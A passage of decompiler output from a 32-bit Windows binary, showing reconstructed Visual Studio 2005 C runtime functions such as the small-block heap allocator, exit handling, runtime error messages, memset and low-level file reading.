    *piVar4 = param_3;
    *(int *)(param_3 + -4 + (int)piVar4) = param_3;
  }
  return 1;
}



// Library Function - Single Match
//  ___sbh_alloc_block
// 
// Library: Visual Studio 2005 Release

int * __cdecl ___sbh_alloc_block(uint *param_1)

{
  int *piVar1;
  char *pcVar2;
  int *piVar3;
  char cVar4;
  int *piVar5;
  byte bVar6;
  uint uVar7;
  int iVar8;
  uint *puVar9;
  int iVar10;
  uint uVar11;
  int *piVar12;
  uint *puVar13;
  uint *puVar14;
  uint uVar15;
  int iVar16;
  uint local_c;
  int local_8;
  
  puVar9 = DAT_00425804 + DAT_00425800 * 5;
  uVar7 = (int)param_1 + 0x17U & 0xfffffff0;
  iVar8 = ((int)((int)param_1 + 0x17U) >> 4) + -1;
  bVar6 = (byte)iVar8;
  param_1 = DAT_0042580c;
  if (iVar8 < 0x20) {
    uVar15 = 0xffffffff >> (bVar6 & 0x1f);
    local_c = 0xffffffff;
  }
  else {
    uVar15 = 0;
    local_c = 0xffffffff >> (bVar6 - 0x20 & 0x1f);
  }
  for (; (param_1 < puVar9 && ((param_1[1] & local_c | *param_1 & uVar15) == 0));
      param_1 = param_1 + 5) {
  }
  puVar13 = DAT_00425804;
  if (param_1 == puVar9) {
    for (; (puVar13 < DAT_0042580c && ((puVar13[1] & local_c | *puVar13 & uVar15) == 0));
        puVar13 = puVar13 + 5) {
    }
    param_1 = puVar13;
    if (puVar13 == DAT_0042580c) {
      for (; (puVar13 < puVar9 && (puVar13[2] == 0)); puVar13 = puVar13 + 5) {
      }
      puVar14 = DAT_00425804;
      param_1 = puVar13;
      if (puVar13 == puVar9) {
        for (; (puVar14 < DAT_0042580c && (puVar14[2] == 0)); puVar14 = puVar14 + 5) {
        }
        param_1 = puVar14;
        if ((puVar14 == DAT_0042580c) &&
           (param_1 = ___sbh_alloc_new_region(), param_1 == (uint *)0x0)) {
          return (int *)0x0;
        }
      }
      iVar8 = ___sbh_alloc_new_group((int)param_1);
      *(int *)param_1[4] = iVar8;
      if (*(int *)param_1[4] == -1) {
        return (int *)0x0;
      }
    }
  }
  piVar5 = (int *)param_1[4];
  local_8 = *piVar5;
  if ((local_8 == -1) || ((piVar5[local_8 + 0x31] & local_c | piVar5[local_8 + 0x11] & uVar15) == 0)
     ) {
    local_8 = 0;
    puVar9 = (uint *)(piVar5 + 0x11);
    uVar11 = piVar5[0x31];
    while ((uVar11 & local_c | *puVar9 & uVar15) == 0) {
      local_8 = local_8 + 1;
      puVar13 = puVar9 + 0x21;
      puVar9 = puVar9 + 1;
      uVar11 = *puVar13;
    }
  }
  piVar3 = piVar5 + local_8 * 0x81 + 0x51;
  iVar8 = 0;
  uVar15 = piVar5[local_8 + 0x11] & uVar15;
  if (uVar15 == 0) {
    uVar15 = piVar5[local_8 + 0x31] & local_c;
    iVar8 = 0x20;
  }
  for (; -1 < (int)uVar15; uVar15 = uVar15 * 2) {
    iVar8 = iVar8 + 1;
  }
  piVar12 = (int *)piVar3[iVar8 * 2 + 1];
  iVar10 = *piVar12 - uVar7;
  iVar16 = (iVar10 >> 4) + -1;
  if (0x3f < iVar16) {
    iVar16 = 0x3f;
  }
  DAT_0042580c = param_1;
  if (iVar16 != iVar8) {
    if (piVar12[1] == piVar12[2]) {
      if (iVar8 < 0x20) {
        pcVar2 = (char *)((int)piVar5 + iVar8 + 4);
        uVar15 = ~(0x80000000U >> ((byte)iVar8 & 0x1f));
        piVar5[local_8 + 0x11] = uVar15 & piVar5[local_8 + 0x11];
        *pcVar2 = *pcVar2 + -1;
        if (*pcVar2 == '\0') {
          *param_1 = *param_1 & uVar15;
        }
      }
      else {
        pcVar2 = (char *)((int)piVar5 + iVar8 + 4);
        uVar15 = ~(0x80000000U >> ((byte)iVar8 - 0x20 & 0x1f));
        piVar5[local_8 + 0x31] = piVar5[local_8 + 0x31] & uVar15;
        *pcVar2 = *pcVar2 + -1;
        if (*pcVar2 == '\0') {
          param_1[1] = param_1[1] & uVar15;
        }
      }
    }
    *(int *)(piVar12[2] + 4) = piVar12[1];
    *(int *)(piVar12[1] + 8) = piVar12[2];
    if (iVar10 == 0) goto LAB_0040ef40;
    piVar1 = piVar3 + iVar16 * 2;
    iVar8 = piVar1[1];
    piVar12[2] = (int)piVar1;
    piVar12[1] = iVar8;
    piVar1[1] = (int)piVar12;
    *(int **)(piVar12[1] + 8) = piVar12;
    if (piVar12[1] == piVar12[2]) {
      cVar4 = *(char *)(iVar16 + 4 + (int)piVar5);
      *(char *)(iVar16 + 4 + (int)piVar5) = cVar4 + '\x01';
      bVar6 = (byte)iVar16;
      if (iVar16 < 0x20) {
        if (cVar4 == '\0') {
          *param_1 = *param_1 | 0x80000000U >> (bVar6 & 0x1f);
        }
        piVar5[local_8 + 0x11] = piVar5[local_8 + 0x11] | 0x80000000U >> (bVar6 & 0x1f);
      }
      else {
        if (cVar4 == '\0') {
          param_1[1] = param_1[1] | 0x80000000U >> (bVar6 - 0x20 & 0x1f);
        }
        piVar5[local_8 + 0x31] = piVar5[local_8 + 0x31] | 0x80000000U >> (bVar6 - 0x20 & 0x1f);
      }
    }
  }
  if (iVar10 != 0) {
    *piVar12 = iVar10;
    *(int *)(iVar10 + -4 + (int)piVar12) = iVar10;
  }
LAB_0040ef40:
  piVar12 = (int *)((int)piVar12 + iVar10);
  *piVar12 = uVar7 + 1;
  *(uint *)((int)piVar12 + (uVar7 - 4)) = uVar7 + 1;
  iVar8 = *piVar3;
  *piVar3 = iVar8 + 1;
  if (((iVar8 == 0) && (param_1 == DAT_00423eb0)) && (local_8 == DAT_00425814)) {
    DAT_00423eb0 = (uint *)0x0;
  }
  *piVar5 = local_8;
  return piVar12 + 1;
}



// Library Function - Single Match
//  ___heap_select
// 
// Library: Visual Studio 2005 Release

undefined4 ___heap_select(void)

{
  int iVar1;
  uint local_c;
  int local_8;
  
  local_8 = 0;
  local_c = 0;
  iVar1 = __get_osplatform(&local_8);
  if (iVar1 != 0) {
                    // WARNING: Subroutine does not return
    __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  iVar1 = __get_winmajor(&local_c);
  if (iVar1 != 0) {
                    // WARNING: Subroutine does not return
    __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  if ((local_8 == 2) && (4 < local_c)) {
    return 1;
  }
  return 3;
}



// Library Function - Single Match
//  __heap_init
// 
// Library: Visual Studio 2005 Release

int __cdecl __heap_init(void)

{
  int iVar1;
  int in_stack_00000004;
  
  DAT_00423eb4 = HeapCreate((uint)(in_stack_00000004 == 0),0x1000,0);
  if (DAT_00423eb4 == (HANDLE)0x0) {
    return 0;
  }
  DAT_004257fc = ___heap_select();
  if ((DAT_004257fc == 3) && (iVar1 = ___sbh_heap_init(0x3f8), iVar1 == 0)) {
    HeapDestroy(DAT_00423eb4);
    DAT_00423eb4 = (HANDLE)0x0;
    return 0;
  }
  return 1;
}



// Library Function - Single Match
//  __amsg_exit
// 
// Library: Visual Studio 2005 Release

void __cdecl __amsg_exit(int param_1)

{
  code *pcVar1;
  
  __FF_MSGBANNER();
  __NMSG_WRITE(param_1);
  pcVar1 = (code *)__decode_pointer(DAT_00422594);
  (*pcVar1)(0xff);
  return;
}



void __cdecl FUN_0040f05c(undefined4 param_1)

{
  HMODULE hModule;
  FARPROC pFVar1;
  
  hModule = GetModuleHandleA(s_mscoree_dll_0041c358);
  if (hModule != (HMODULE)0x0) {
    pFVar1 = GetProcAddress(hModule,s_CorExitProcess_0041c348);
    if (pFVar1 != (FARPROC)0x0) {
      (*pFVar1)(param_1);
    }
  }
  return;
}



// Library Function - Single Match
//  ___crtExitProcess
// 
// Library: Visual Studio 2005 Release

void __cdecl ___crtExitProcess(int param_1)

{
  FUN_0040f05c(param_1);
                    // WARNING: Subroutine does not return
  ExitProcess(param_1);
}



void FUN_0040f097(void)

{
  __lock(8);
  return;
}



void FUN_0040f0a0(void)

{
  FUN_0040e37b(8);
  return;
}



// Library Function - Single Match
//  __initterm
// 
// Library: Visual Studio 2005 Release

void __cdecl __initterm(undefined **param_1)

{
  code **in_EAX;
  
  for (; in_EAX < param_1; in_EAX = in_EAX + 1) {
    if (*in_EAX != (code *)0x0) {
      (**in_EAX)();
    }
  }
  return;
}



// Library Function - Single Match
//  __initterm_e
// 
// Library: Visual Studio 2005 Release

void __cdecl __initterm_e(undefined **param_1,undefined **param_2)

{
  int iVar1;
  
  iVar1 = 0;
  while ((param_1 < param_2 && (iVar1 == 0))) {
    if ((code *)*param_1 != (code *)0x0) {
      iVar1 = (*(code *)*param_1)();
    }
    param_1 = (code **)param_1 + 1;
  }
  return;
}



// Library Function - Single Match
//  __get_osplatform
// 
// Library: Visual Studio 2005 Release

undefined4 __cdecl __get_osplatform(int *param_1)

{
  int *piVar1;
  
  if ((param_1 != (int *)0x0) && (DAT_00423ebc != 0)) {
    *param_1 = DAT_00423ebc;
    return 0;
  }
  piVar1 = __errno();
  *piVar1 = 0x16;
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return 0x16;
}



// Library Function - Single Match
//  __get_winmajor
// 
// Library: Visual Studio 2005 Release

undefined4 __cdecl __get_winmajor(undefined4 *param_1)

{
  int *piVar1;
  
  if ((param_1 != (undefined4 *)0x0) && (DAT_00423ebc != 0)) {
    *param_1 = DAT_00423ec8;
    return 0;
  }
  piVar1 = __errno();
  *piVar1 = 0x16;
  __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  return 0x16;
}



// Library Function - Single Match
//  __cinit
// 
// Library: Visual Studio 2005 Release

int __cdecl __cinit(int param_1)

{
  BOOL BVar1;
  int iVar2;
  code **ppcVar3;
  
  if ((DAT_0041ffd8 != (code *)0x0) &&
     (BVar1 = __IsNonwritableInCurrentImage((PBYTE)&DAT_0041ffd8), BVar1 != 0)) {
    (*DAT_0041ffd8)(param_1);
  }
  __initp_misc_cfltcvt_tab();
  iVar2 = __initterm_e((undefined **)&DAT_0041c22c,(undefined **)&DAT_0041c248);
  if (iVar2 == 0) {
    _atexit((_func_4879 *)&LAB_00413942);
    ppcVar3 = (code **)&DAT_0041c224;
    do {
      if (*ppcVar3 != (code *)0x0) {
        (**ppcVar3)();
      }
      ppcVar3 = ppcVar3 + 1;
    } while (ppcVar3 < &DAT_0041c228);
    if ((DAT_004257f8 != (code *)0x0) &&
       (BVar1 = __IsNonwritableInCurrentImage((PBYTE)&DAT_004257f8), BVar1 != 0)) {
      (*DAT_004257f8)(0,2,0);
    }
    iVar2 = 0;
  }
  return iVar2;
}



// WARNING: Function: __SEH_prolog4 replaced with injection: SEH_prolog4
// WARNING: Function: __SEH_epilog4 replaced with injection: EH_epilog3
// WARNING: Removing unreachable block (ram,0x0040f2a5)
// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Single Match
//  _doexit
// 
// Library: Visual Studio 2005 Release

void __cdecl _doexit(int param_1,int param_2,int param_3)

{
  code **ppcVar1;
  code **local_20;
  
  __lock(8);
  if (DAT_00423efc != 1) {
    _DAT_00423ef8 = 1;
    DAT_00423ef4 = (undefined)param_3;
    if (param_2 == 0) {
      ppcVar1 = (code **)__decode_pointer(DAT_004257f0);
      local_20 = (code **)__decode_pointer(DAT_004257ec);
      if (ppcVar1 != (code **)0x0) {
        while (local_20 = local_20 + -1, ppcVar1 <= local_20) {
          if (*local_20 != (code *)0x0) {
            (**local_20)();
          }
        }
      }
      __initterm((undefined **)&DAT_0041c258);
    }
    __initterm((undefined **)&DAT_0041c264);
  }
  FUN_0040f29f();
  if (param_3 != 0) {
    return;
  }
  DAT_00423efc = 1;
  FUN_0040e37b(8);
  ___crtExitProcess(param_1);
  return;
}



void FUN_0040f29f(void)

{
  int unaff_EBP;
  
  if (*(int *)(unaff_EBP + 0x10) != 0) {
    FUN_0040e37b(8);
  }
  return;
}



// Library Function - Single Match
//  _exit
// 
// Library: Visual Studio 2005 Release

void __cdecl _exit(int _Code)

{
  _doexit(_Code,0,0);
  return;
}



// Library Function - Single Match
//  __exit
// 
// Library: Visual Studio 2005 Release

void __cdecl __exit(int param_1)

{
  _doexit(param_1,1,0);
  return;
}



// Library Function - Single Match
//  __cexit
// 
// Library: Visual Studio 2005 Release

void __cdecl __cexit(void)

{
  _doexit(0,0,1);
  return;
}



// Library Function - Single Match
//  __init_pointers
// 
// Library: Visual Studio 2005 Release

void __cdecl __init_pointers(void)

{
  undefined4 uVar1;
  
  uVar1 = __encoded_null();
  FUN_0040f519(uVar1);
  FUN_0041429d(uVar1);
  FUN_0040ce47(uVar1);
  FUN_00414d0f(uVar1);
  FUN_00414d05(uVar1);
  __initp_misc_winsig(uVar1);
  FUN_00413297();
  __initp_eh_hooks();
  DAT_00422594 = __encode_pointer(0x40f2c5);
  return;
}



// Library Function - Single Match
//  __NMSG_WRITE
// 
// Library: Visual Studio 2005 Release

void __cdecl __NMSG_WRITE(int param_1)

{
  char **ppcVar1;
  int iVar2;
  errno_t eVar3;
  DWORD DVar4;
  size_t sVar5;
  HANDLE hFile;
  uint uVar6;
  DWORD *lpNumberOfBytesWritten;
  LPOVERLAPPED lpOverlapped;
  DWORD DStack_4;
  
  uVar6 = 0;
  do {
    if (param_1 == (&DAT_00422598)[uVar6 * 2]) break;
    uVar6 = uVar6 + 1;
  } while ((int)uVar6 < 0x17);
  if (uVar6 < 0x17) {
    iVar2 = __set_error_mode(3);
    if ((iVar2 == 1) || ((iVar2 = __set_error_mode(3), iVar2 == 0 && (DAT_00422040 == 1)))) {
      hFile = GetStdHandle(0xfffffff4);
      if ((hFile != (HANDLE)0x0) && (hFile != (HANDLE)0xffffffff)) {
        lpOverlapped = (LPOVERLAPPED)0x0;
        lpNumberOfBytesWritten = &DStack_4;
        ppcVar1 = (char **)(uVar6 * 8 + 0x42259c);
        sVar5 = _strlen(*ppcVar1);
        WriteFile(hFile,*ppcVar1,sVar5,lpNumberOfBytesWritten,lpOverlapped);
      }
    }
    else if (param_1 != 0xfc) {
      eVar3 = _strcpy_s(&DAT_00423f00,0x314,s_Runtime_Error__Program__0041c900);
      if (eVar3 != 0) {
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      DAT_0042401d = 0;
      DVar4 = GetModuleFileNameA((HMODULE)0x0,&DAT_00423f19,0x104);
      if ((DVar4 == 0) &&
         (eVar3 = _strcpy_s(&DAT_00423f19,0x2fb,s_<program_name_unknown>_0041c8e8), eVar3 != 0)) {
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      sVar5 = _strlen(&DAT_00423f19);
      if (0x3c < sVar5 + 1) {
        sVar5 = _strlen(&DAT_00423f19);
        eVar3 = _strncpy_s((char *)(sVar5 + 0x423ede),
                           (int)&DAT_00424214 - (int)(char *)(sVar5 + 0x423ede),&DAT_0041c8e4,3);
        if (eVar3 != 0) {
                    // WARNING: Subroutine does not return
          __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
        }
      }
      eVar3 = _strcat_s(&DAT_00423f00,0x314,&DAT_0041c8e0);
      if (eVar3 != 0) {
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      eVar3 = _strcat_s(&DAT_00423f00,0x314,*(char **)(uVar6 * 8 + 0x42259c));
      if (eVar3 != 0) {
                    // WARNING: Subroutine does not return
        __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
      }
      ___crtMessageBoxA(&DAT_00423f00,s_Microsoft_Visual_C___Runtime_Lib_0041c8b8,0x12010);
    }
  }
  return;
}



// Library Function - Single Match
//  __FF_MSGBANNER
// 
// Library: Visual Studio 2005 Release

void __cdecl __FF_MSGBANNER(void)

{
  int iVar1;
  
  iVar1 = __set_error_mode(3);
  if (iVar1 != 1) {
    iVar1 = __set_error_mode(3);
    if (iVar1 != 0) {
      return;
    }
    if (DAT_00422040 != 1) {
      return;
    }
  }
  __NMSG_WRITE(0xfc);
  __NMSG_WRITE(0xff);
  return;
}



void __cdecl FUN_0040f519(undefined4 param_1)

{
  DAT_00424214 = param_1;
  return;
}



// Library Function - Single Match
//  __callnewh
// 
// Library: Visual Studio 2005 Release

int __cdecl __callnewh(size_t _Size)

{
  code *pcVar1;
  int iVar2;
  
  pcVar1 = (code *)__decode_pointer(DAT_00424214);
  if (pcVar1 != (code *)0x0) {
    iVar2 = (*pcVar1)(_Size);
    if (iVar2 != 0) {
      return 1;
    }
  }
  return 0;
}



// Library Function - Single Match
//  _memset
// 
// Libraries: Visual Studio 2005 Debug, Visual Studio 2005 Release, Visual Studio 2008 Debug, Visual
// Studio 2008 Release

void * __cdecl _memset(void *_Dst,int _Val,size_t _Size)

{
  uint uVar1;
  undefined (*pauVar2) [16];
  uint uVar3;
  size_t sVar4;
  uint *puVar5;
  
  if (_Size == 0) {
    return _Dst;
  }
  uVar1 = _Val & 0xff;
  if ((((char)_Val == '\0') && (0xff < _Size)) && (DAT_004257e4 != 0)) {
    pauVar2 = __VEC_memzero((undefined (*) [16])_Dst,_Val,_Size);
    return pauVar2;
  }
  puVar5 = (uint *)_Dst;
  if (3 < _Size) {
    uVar3 = -(int)_Dst & 3;
    sVar4 = _Size;
    if (uVar3 != 0) {
      sVar4 = _Size - uVar3;
      do {
        *(char *)puVar5 = (char)_Val;
        puVar5 = (uint *)((int)puVar5 + 1);
        uVar3 = uVar3 - 1;
      } while (uVar3 != 0);
    }
    uVar1 = uVar1 * 0x1010101;
    _Size = sVar4 & 3;
    uVar3 = sVar4 >> 2;
    if (uVar3 != 0) {
      for (; uVar3 != 0; uVar3 = uVar3 - 1) {
        *puVar5 = uVar1;
        puVar5 = puVar5 + 1;
      }
      if (_Size == 0) {
        return _Dst;
      }
    }
  }
  do {
    *(char *)puVar5 = (char)uVar1;
    puVar5 = (uint *)((int)puVar5 + 1);
    _Size = _Size - 1;
  } while (_Size != 0);
  return _Dst;
}



// Library Function - Single Match
//  __filbuf
// 
// Library: Visual Studio 2005 Release

int __cdecl __filbuf(FILE *_File)

{
  byte bVar1;
  int *piVar2;
  int iVar3;
  uint uVar4;
  undefined *puVar5;
  char *_DstBuf;
  
  if (_File == (FILE *)0x0) {
    piVar2 = __errno();
    *piVar2 = 0x16;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  }
  else {
    uVar4 = _File->_flag;
    if (((uVar4 & 0x83) != 0) && ((uVar4 & 0x40) == 0)) {
      if ((uVar4 & 2) == 0) {
        _File->_flag = uVar4 | 1;
        if ((uVar4 & 0x10c) == 0) {
          __getbuf(_File);
        }
        else {
          _File->_ptr = _File->_base;
        }
        uVar4 = _File->_bufsiz;
        _DstBuf = _File->_base;
        iVar3 = __fileno(_File);
        iVar3 = __read(iVar3,_DstBuf,uVar4);
        _File->_cnt = iVar3;
        if ((iVar3 != 0) && (iVar3 != -1)) {
          if ((*(byte *)&_File->_flag & 0x82) == 0) {
            iVar3 = __fileno(_File);
            if ((iVar3 == -1) || (iVar3 = __fileno(_File), iVar3 == -2)) {
              puVar5 = &DAT_00422448;
            }
            else {
              iVar3 = __fileno(_File);
              uVar4 = __fileno(_File);
              puVar5 = (undefined *)((uVar4 & 0x1f) * 0x28 + (&DAT_00425820)[iVar3 >> 5]);
            }
            if ((puVar5[4] & 0x82) == 0x82) {
              _File->_flag = _File->_flag | 0x2000;
            }
          }
          if (((_File->_bufsiz == 0x200) && ((_File->_flag & 8U) != 0)) &&
             ((_File->_flag & 0x400U) == 0)) {
            _File->_bufsiz = 0x1000;
          }
          _File->_cnt = _File->_cnt + -1;
          bVar1 = *_File->_ptr;
          _File->_ptr = _File->_ptr + 1;
          return (uint)bVar1;
        }
        _File->_flag = _File->_flag | (-(uint)(iVar3 != 0) & 0x10) + 0x10;
        _File->_cnt = 0;
      }
      else {
        _File->_flag = uVar4 | 0x20;
      }
    }
  }
  return -1;
}



// Library Function - Single Match
//  __read_nolock
// 
// Library: Visual Studio 2005 Release

int __cdecl __read_nolock(int _FileHandle,void *_DstBuf,uint _MaxCharCount)

{
  byte *pbVar1;
  uint uVar2;
  byte bVar3;
  char cVar4;
  short sVar5;
  ulong *puVar6;
  int *piVar7;
  short *psVar8;
  BOOL BVar9;
  uint uVar10;
  DWORD DVar11;
  int iVar12;
  ulong uVar13;
  int unaff_EBX;
  int iVar14;
  short *psVar15;
  uint local_1c;
  int local_18;
  short *local_14;
  short *local_10;
  undefined2 local_c;
  char local_6;
  char local_5;
  
  uVar2 = _MaxCharCount;
  local_18 = -2;
  if (_FileHandle == -2) {
    puVar6 = ___doserrno();
    *puVar6 = 0;
    piVar7 = __errno();
    *piVar7 = 9;
    return -1;
  }
  if ((_FileHandle < 0) || (DAT_00425818 <= (uint)_FileHandle)) {
    puVar6 = ___doserrno();
    *puVar6 = 0;
    piVar7 = __errno();
    *piVar7 = 9;
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    return -1;
  }
  iVar14 = (_FileHandle & 0x1fU) * 0x28;
  piVar7 = &DAT_00425820 + (_FileHandle >> 5);
  bVar3 = *(byte *)(*piVar7 + iVar14 + 4);
  if ((bVar3 & 1) == 0) {
    puVar6 = ___doserrno();
    *puVar6 = 0;
    piVar7 = __errno();
    *piVar7 = 9;
    goto LAB_0040f8d2;
  }
  local_14 = (short *)0x0;
  if ((_MaxCharCount == 0) || ((bVar3 & 2) != 0)) {
    return 0;
  }
  if (_DstBuf == (void *)0x0) {
LAB_0040f8c0:
    puVar6 = ___doserrno();
    *puVar6 = 0;
    piVar7 = __errno();
    *piVar7 = 0x16;
LAB_0040f8d2:
    __invalid_parameter((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
    return -1;
  }
  local_6 = (char)(*(char *)(*piVar7 + iVar14 + 0x24) * '\x02') >> 1;
  if (local_6 == '\x01') {
    if ((~_MaxCharCount & 1) == 0) goto LAB_0040f8c0;
    uVar10 = _MaxCharCount >> 1;
    _MaxCharCount = 4;
    if (3 < uVar10) {
      _MaxCharCount = uVar10;
    }
    local_10 = (short *)__malloc_crt(_MaxCharCount);
    if (local_10 == (short *)0x0) {
      piVar7 = __errno();
      *piVar7 = 0xc;
      puVar6 = ___doserrno();
      *puVar6 = 8;
      return -1;
    }
  }
  else {
    if (local_6 == '\x02') {
      if ((~_MaxCharCount & 1) == 0) goto LAB_0040f8c0;
      _MaxCharCount = _MaxCharCount & 0xfffffffe;
    }
    local_10 = (short *)_DstBuf;
  }
  psVar8 = local_10;
  uVar10 = _MaxCharCount;
  if ((((*(byte *)(iVar14 + *piVar7 + 4) & 0x48) != 0) &&
      (cVar4 = *(char *)(iVar14 + *piVar7 + 5), cVar4 != '\n')) && (_MaxCharCount != 0)) {
    *(char *)local_10 = cVar4;
    psVar8 = (short *)((int)local_10 + 1);
    uVar10 = _MaxCharCount - 1;
    local_14 = (short *)0x1;
    *(undefined *)(iVar14 + 5 + *piVar7) = 10;
    if (((local_6 != '\0') && (cVar4 = *(char *)(iVar14 + 0x25 + *piVar7), cVar4 != '\n')) &&
       (uVar10 != 0)) {
      *(char *)psVar8 = cVar4;
      psVar8 = local_10 + 1;
      uVar10 = _MaxCharCount - 2;
      local_14 = (short *)0x2;
      *(undefined *)(iVar14 + 0x25 + *piVar7) = 10;
      if (((local_6 == '\x01') && (cVar4 = *(char *)(iVar14 + 0x26 + *piVar7), cVar4 != '\n')) &&
         (uVar10 != 0)) {
        *(char *)psVar8 = cVar4;
        psVar8 = (short *)((int)local_10 + 3);
        local_14 = (short *)0x3;
        *(undefined *)(iVar14 + 0x26 + *piVar7) = 10;
        uVar10 = _MaxCharCount - 3;
      }
    }
  }
  _MaxCharCount = uVar10;
  BVar9 = ReadFile(*(HANDLE *)(iVar14 + *piVar7),psVar8,_MaxCharCount,&local_1c,(LPOVERLAPPED)0x0);
  if (((BVar9 == 0) || ((int)local_1c < 0)) || (_MaxCharCount < local_1c)) {
    uVar13 = GetLastError();
    if (uVar13 != 5) {
      if (uVar13 == 0x6d) {
        local_18 = 0;
        goto LAB_0040faef;
      }
      goto LAB_0040fae4;
    }
    piVar7 = __errno();
    *piVar7 = 9;
    puVar6 = ___doserrno();
    *puVar6 = 5;
  }
  else {
    local_14 = (short *)((int)local_14 + local_1c);
    pbVar1 = (byte *)(iVar14 + 4 + *piVar7);
    if ((*pbVar1 & 0x80) == 0) goto LAB_0040faef;
    if (local_6 == '\x02') {
      if ((local_1c == 0) || (*local_10 != 10)) {
        *pbVar1 = *pbVar1 & 0xfb;
      }
      else {
        *pbVar1 = *pbVar1 | 4;
      }
      local_14 = (short *)((int)local_14 + (int)local_10);
      _MaxCharCount = (uint)local_10;
      psVar8 = local_10;
      if (local_10 < local_14) {
        do {
          sVar5 = *(short *)_MaxCharCount;
          if (sVar5 == 0x1a) {
            pbVar1 = (byte *)(iVar14 + 4 + *piVar7);
            if ((*pbVar1 & 0x40) == 0) {
              *pbVar1 = *pbVar1 | 2;
            }
            else {
              *psVar8 = *(short *)_MaxCharCount;
              psVar8 = psVar8 + 1;
            }
            break;
          }
          if (sVar5 == 0xd) {
            if (_MaxCharCount < local_14 + -1) {
              if (*(short *)(_MaxCharCount + 2) == 10) {
                uVar2 = _MaxCharCount + 4;
                goto LAB_0040fb82;
              }
LAB_0040fc17:
              _MaxCharCount = _MaxCharCount + 2;
              *psVar8 = 0xd;
            }
            else {
              uVar2 = _MaxCharCount + 2;
              BVar9 = ReadFile(*(HANDLE *)(iVar14 + *piVar7),&local_c,2,&local_1c,(LPOVERLAPPED)0x0)
              ;
              if (((BVar9 == 0) && (DVar11 = GetLastError(), DVar11 != 0)) || (local_1c == 0))
              goto LAB_0040fc17;
              if ((*(byte *)(iVar14 + 4 + *piVar7) & 0x48) == 0) {
                if ((psVar8 == local_10) && (local_c == 10)) goto LAB_0040fb82;
                __lseeki64_nolock(_FileHandle,0x1ffffffff,unaff_EBX);
                if (local_c == 10) goto LAB_0040fc1e;
                goto LAB_0040fc17;
              }
              if (local_c == 10) {
LAB_0040fb82:
                _MaxCharCount = uVar2;
                *psVar8 = 10;
              }
              else {
                *psVar8 = 0xd;
                *(undefined *)(iVar14 + 5 + *piVar7) = (undefined)local_c;
                *(undefined *)(iVar14 + 0x25 + *piVar7) = local_c._1_1_;
                *(undefined *)(iVar14 + 0x26 + *piVar7) = 10;
                _MaxCharCount = uVar2;
              }
            }
            psVar8 = psVar8 + 1;
            uVar2 = _MaxCharCount;
          }
          else {
            *psVar8 = sVar5;
            psVar8 = psVar8 + 1;
            uVar2 = _MaxCharCount + 2;
          }
LAB_0040fc1e:
          _MaxCharCount = uVar2;
        } while (_MaxCharCount < local_14);
      }
      local_14 = (short *)((int)psVar8 - (int)local_10);
      goto LAB_0040faef;
    }
    if ((local_1c == 0) || (*(char *)local_10 != '\n')) {
      *pbVar1 = *pbVar1 & 0xfb;
    }
    else {
      *pbVar1 = *pbVar1 | 4;
    }
    local_14 = (short *)((int)local_14 + (int)local_10);
    _MaxCharCount = (uint)local_10;
    psVar8 = local_10;
    if (local_10 < local_14) {
      do {
        cVar4 = *(char *)_MaxCharCount;
        if (cVar4 == '\x1a') {
          pbVar1 = (byte *)(iVar14 + 4 + *piVar7);
          if ((*pbVar1 & 0x40) == 0) {
            *pbVar1 = *pbVar1 | 2;
          }
          else {
            *(undefined *)psVar8 = *(undefined *)_MaxCharCount;
            psVar8 = (short *)((int)psVar8 + 1);
          }
          break;
        }
        if (cVar4 == '\r') {
          if (_MaxCharCount < (undefined *)((int)local_14 + -1)) {
            if (*(char *)(_MaxCharCount + 1) == '\n') {
              uVar10 = _MaxCharCount + 2;
              goto LAB_0040f96f;
            }
LAB_0040f9e6:
            _MaxCharCount = _MaxCharCount + 1;
            *(undefined *)psVar8 = 0xd;
          }
          else {
            uVar10 = _MaxCharCount + 1;
            BVar9 = ReadFile(*(HANDLE *)(iVar14 + *piVar7),&local_5,1,&local_1c,(LPOVERLAPPED)0x0);
            if (((BVar9 == 0) && (DVar11 = GetLastError(), DVar11 != 0)) || (local_1c == 0))
            goto LAB_0040f9e6;
            if ((*(byte *)(iVar14 + 4 + *piVar7) & 0x48) == 0) {
              if ((psVar8 == local_10) && (local_5 == '\n')) goto LAB_0040f96f;
              __lseeki64_nolock(_FileHandle,0x1ffffffff,unaff_EBX);
              if (local_5 == '\n') goto LAB_0040f9ea;
              goto LAB_0040f9e6;
            }
            if (local_5 == '\n') {
LAB_0040f96f:
              _MaxCharCount = uVar10;
              *(undefined *)psVar8 = 10;
            }
            else {
              *(undefined *)psVar8 = 0xd;
              *(char *)(iVar14 + 5 + *piVar7) = local_5;
              _MaxCharCount = uVar10;
            }
          }
          psVar8 = (short *)((int)psVar8 + 1);
          uVar10 = _MaxCharCount;
        }
        else {
          *(char *)psVar8 = cVar4;
          psVar8 = (short *)((int)psVar8 + 1);
          uVar10 = _MaxCharCount + 1;
        }
LAB_0040f9ea:
        _MaxCharCount = uVar10;
      } while (_MaxCharCount < local_14);
    }
    local_14 = (short *)((int)psVar8 - (int)local_10);
    if ((local_6 != '\x01') || (local_14 == (short *)0x0)) goto LAB_0040faef;
    bVar3 = *(byte *)(short *)((int)psVar8 + -1);
    if ((char)bVar3 < '\0') {
      iVar12 = 1;
      psVar8 = (short *)((int)psVar8 + -1);
      while ((((&DAT_00422650)[bVar3] == '\0' && (iVar12 < 5)) && (local_10 <= psVar8))) {
